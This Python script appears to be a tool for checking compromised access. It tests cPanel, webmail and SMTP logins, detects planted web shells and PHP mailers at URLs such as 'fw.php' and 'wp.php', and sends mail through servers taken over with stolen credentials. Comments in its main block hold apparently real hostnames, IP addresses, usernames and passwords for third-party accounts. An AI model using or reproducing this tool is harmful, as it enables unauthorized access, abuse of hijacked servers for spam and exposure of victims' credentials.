import requests
import hashlib
import os
from urllib.parse import urlparse
import poplib
import socket
import smtplib, ssl
from email.mime.text import MIMEText
from random import randrange
import sys
# import pycurl
# import StringIO

code = 0
def curl(url, data=""):
	session = requests.Session()
	global code
	url = url.strip()                 
	rad = hashlib.md5(str(randrange(1000000000, 9999999999, 1)).encode()).hexdigest()
	path = "./cookies/" + rad
	isExist = os.path.exists(path)
	if isExist:
		rad = hashlib.md5(str(randrange(1000000000, 9999999999, 1)).encode()).hexdigest()
		path = "./cookies/" + rad

	headers = {
				"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0",

			}
	verify = False
	timeout = 35
	cookie = {}
	try:
		with open(path) as f:
		    for line in f:
		       (key, val) = line.split()
		       cookie[key] = val
	except Exception as inst:
		pass
	if data != "":
		rez = session.post(url = url, verify = verify, timeout=timeout, data = data, headers = headers, cookies = cookie)
	else:
		rez = session.get(url = url, verify = verify, timeout=timeout, headers = headers, cookies = cookie)
	result = rez.content.decode('utf-8')
	if os.path.exists(path):
	 	os.remove(path)
	code = rez.status_code
	return result

def cpCheck(host, user, passwd):
	if host[-1] != '/':
		host = host + '/'
	user = user.strip()
	passwd = passwd.strip()

	data = {
		'user':user,
		'pass':passwd
	}

	rez = curl(url= host+"login/?login_only=1", data = data)

	if '"status"' in rez and '"redirect"' in rez and '"security_token"' in rez:
		return 1
	else:
		return 0

def shellCheck(url, passwd = ''):

	if passwd != '':
		# data  = 'pass=' + passwd
		data = {
			'pass':passwd
		}
	else:
		data = ""
	rez = curl(url, data)

	if 'File manager' in rez:
		return 1
	else:
		return 0
def mailerCheck(url):
	words = [
		'subject','sendmail','mailer','emails','mail sender'
	]

	rez = curl(url)
	rez =  rez.lower()
	if code != 200:
		return 0

	for w in words:
		if rez.find(w) >=0:
			return 1
	return 0

def WebmailCheck(host, user, passwd, link):

	host = host.strip()
	user = user.strip()
	passwd = passwd.strip()
	link = link.strip()

	try:
		# webmail server connection
		server = poplib.POP3(host,110, 14)
		server.set_debuglevel(0)
		server.user(user)
		server.pass_(passwd)

		return 1
	except Exception as inst:
		# print(inst)
		try:
			p = urlparse(link)
			server = poplib.POP3(p.hostname,110, 14)
			server.set_debuglevel(0)
			server.user(user)
			server.pass_(passwd)
			
			return 1
		except Exception as inst2:
			# print(inst2)
			return 0

	# finally:
	server.quit()

def findPort(host):
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	for port in [25,465,587]:
		result = sock.connect_ex((host,port))
		if result == 0:
			return port
	sock.close()

def sendEmail(host,login,passwd,to,subject,from_):

	host = host.strip()
	port = findPort(host)
	# port = findPort(host)
	login = login.strip()
	passwd = passwd.strip()
	to = to.strip()

	context = ssl._create_unverified_context()
	try:
		if port ==25:
			server = smtplib.SMTP(host, port)
			server.ehlo()
			server.set_debuglevel(1)
			# context.set_ciphers('DEFAULT')
			# server.starttls(context=context)
			server.login(login, passwd)
			
		else:
			server = smtplib.SMTP_SSL(host, port)
			server.ehlo()
			server.set_debuglevel(1)
			server.login(login, passwd)
			# server.starttls()

		body="""This is the HTML body."""

		mail = MIMEText(body, 'plain')
		mail["From"] =  "Leostech"
		mail["To"] = "Leo"
		mail["Subject"] =  subject

		server.sendmail(from_,to, mail.as_string())
		server.quit()
		return 1
	except Exception as inst:
		# print(inst)
		return 0


def checkUnlimited(ip,user,passwd):
	try:
		server = smtplib.SMTP(ip, 25)
		server.ehlo()
		server.login(user,passwd)
		return 1
	except Exception:
		return 0

if __name__ == "__main__":
	try:
		# funcName = sys.argv[1]

		# result = ""
		# if funcName == "cpCheck":
		# 	result = cpCheck(sys.argv[2], sys.argv[3], sys.argv[4]) #host, user, password
		# elif funcName == "shellCheck":
		# 	result = shellCheck(sys.argv[2], sys.argv[3]) # url, password
		# elif funcName == "mailerCheck":
		# 	result = mailerCheck(sys.argv[2])	# url
		# elif funcName == "WebmailCheck":
		# 	result = WebmailCheck(sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5]) # host, user, password, link
		# elif funcName == 'findPort':
		# 	result = findPort(sys.argv[2]) # host.
		# elif funcName == 'sendEmail':
		# 	result = sendEmail(sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5], sys.argv[6], sys.argv[7]) #host, login, password, to, subject, from_

		# elif funcName == 'checkUnlimited':
		# 	result = checkUnlimited(sys.argv[2], sys.argv[3], sys.argv[4]) #ip, user, password
		# host 

		#smtp
		# host = "203.198.23.150"
		# user = "noc2@netvigator.com"
		# password = '123456'

		#cpanel
		# host = "https://pelikaani.net:2083"
		# user =	"pelikaan"
		# password = "joulu11"

		# host = "https://manyano.com:2083"
		# user = "manyano"
		# password = "m@12345"

		host = "http://digitallana.com/fw.php"
		# host =   "122.15.162.182"
		# host = "222.92.128.34"

		# host =   "http://127.0.0.1"
		# host =   "box.etscapacitacion.com"
		# host =   "https://box.etscapacitacion.com"
		# host = "https://pelikaani.net:2083"
		# host = 'http://emergenext.com/wp.php'

		# user 
		# user =	"me@etscapacitacion.com"
		# user =	"user1@plintron.net"
		# user = "public@3dbiooptima.com"
		
		# user =	"pelikaan"

		# password
		# password = "Fuckyou123!@"
		# password = "user1"
		# password = '3dbiooptima'
		
		# password = "joulu11"

		# port
		# port = 587
		result = shellCheck(host)
		# result = cpCheck(host, user, password)
		# result = findPort(host)
		# result = mailerCheck(host)
		# result = WebmailCheck(host, user, password,"")
		# result = sendEmail(host,user, password,"nursultansaudirbaev157@gmail.com", 123, user)
		# result = checkUnlimited(host,user, password)
		print(result)
		# print(result.isdigit())
	except Exception as inst:
		print('0')